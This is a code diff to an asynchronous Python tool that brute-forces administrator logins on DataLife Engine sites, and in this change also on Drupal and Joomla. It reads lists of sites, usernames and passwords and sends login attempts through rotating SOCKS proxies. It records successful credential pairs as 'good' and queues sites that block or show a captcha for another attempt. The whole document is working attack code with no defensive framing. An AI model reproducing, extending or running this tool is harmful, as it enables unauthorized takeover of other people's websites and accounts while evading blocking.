@@ -8,9 +8,13 @@ from urllib.parse import urlsplit
 
 from aiofiles import open as afile
 from aiohttp import ClientSession
-from aiohttp_socks import SocksConnector
+from aiohttp_socks import SocksConnectionError, SocksConnector, SocksError
 from async_timeout import timeout as ftime
 from bs4 import BeautifulSoup
+
+from dle import DLE
+from drupal import Drupal
+from joomla import Joomla
 
 
 @contextlib.contextmanager
@@ -35,22 +39,7 @@ def silent_out():
         loop.set_exception_handler(old_handler)
 
 
-async def parse(text, user, passw):
-    a = BeautifulSoup(text, features="html.parser")
-    b = a.find('select', {'name': 'selected_language'})
-    c = b.find('option', selected=True)['value']
-
-    params = {
-        'subaction': 'dologin',
-        'username': user,
-        'password': passw,
-        'selected_language': c
-    }
-
-    return params
-
-
-async def macros(p, u, s):
+def macros(p, u, s):
     pattern = r'^(.+?)(?=\.)'
     a = (urlsplit(u).hostname).replace('www.', '')
     a = match(pattern, a)[0]
@@ -93,47 +82,43 @@ async def second(s, url, data):
             return [await r.text(), r.status]
 
 
-async def valid(status, text, url):
-    if 'IP address has been blocked' in text or status == 403:
-        await save('block', url)
-        return False
-    elif 'selected_language' not in text:
-        return False
-    elif '"captcha' in text:
-        await save('captcha', url)
-        return False
-    else:
-        return True
-
-
-async def DLE(link, user, passw, proxy):
+async def process(link, user, passw, proxy):
     global finished, good
 
     cproxy = SocksConnector.from_url(f'socks{socks_type}://' + proxy)
 
     try:
-        user = await macros(user, link, '')
-        passw = await macros(passw, link, user)
+        user = macros(user, link, '')
+        passw = macros(passw, link, user)
 
         with silent_out():
-            async with ClientSession(connector=cproxy) as s:
+            # connector=cproxy
+            async with ClientSession() as s:
                 data = await first(s, link)
-                if not await valid(data[1], data[0], link):
+
+                if not module.valid(data[1], data[0]):
                     await save('rebrut', f'{link} - {user}:{passw}')
                     return
 
-                _post = await parse(data[0], user, passw)
-                data = await second(s, link, _post)
-                assert 'action=logout' in data[0]
+                _post = module.parse(data[0], user, passw)
 
-                good += 1
+                if _post is None:
+                    await save('rebrut', f'{link} - {user}:{passw}')
+                    return
+
+                data = await second(s, link, _post)
+                assert module.required in data[0]
+
                 await save('good', f'{link} - {user}:{passw}')
+                good += 1
+    except (SocksConnectionError, SocksError):
+        await save('rebrut', f'{link} - {user}:{passw}')
     except asyncio.TimeoutError:
-        save('timeout', f'{link} - {user}:{passw}')
+        await save('timeout', f'{link} - {user}:{passw}')
     except AssertionError:
         pass
     except Exception as e:
-        save('report', e)
+        await save('report', e)
     finally:
         finished += 1
         print(f'Good: {good}; Done: {finished}', end='\r')
@@ -157,7 +142,7 @@ async def main():
                                      errors="ignore") as sites:
                         async for site in sites:
                             task = asyncio.create_task(
-                                DLE(
+                                process(
                                     site.strip(),
                                     user.strip(),
                                     passw.strip(),
@@ -168,7 +153,7 @@ async def main():
                             curindx += 1
 
                             if curindx >= lenofpr:
-                                if rotate:
+                                if update:
                                     proxies = await proxy_request()
                                     lenofpr = len(proxies) - 10
 
@@ -186,11 +171,27 @@ if __name__ == "__main__":
     good = 0
     finished = 0
 
-    threads = int(input('Threads: '))
-    timeout = int(input('Timeout: '))
+    modules = {
+        '0': DLE(),
+        '1': Drupal(),
+        '2': Joomla()
+    }
+
+    threads = 2  # int(input('Threads: '))
+    timeout = 30  # int(input('Timeout: '))
 
     socks_type = input('SOCKS Ver.: ')
     socks_url = input(f'SOCKS{socks_type} Link: ')
-    rotate = bool(int(input('Rotate proxy: ')))
+    update = bool(int(input('Update proxy: ')))
+
+    module = modules[
+        input(
+            'Modules:\n' +
+            '0 - DLE\n' +
+            '1 - Drupal\n' +
+            '2 - Joomla\n' +
+            'Select: '
+        )
+    ]
 
     asyncio.run(main())
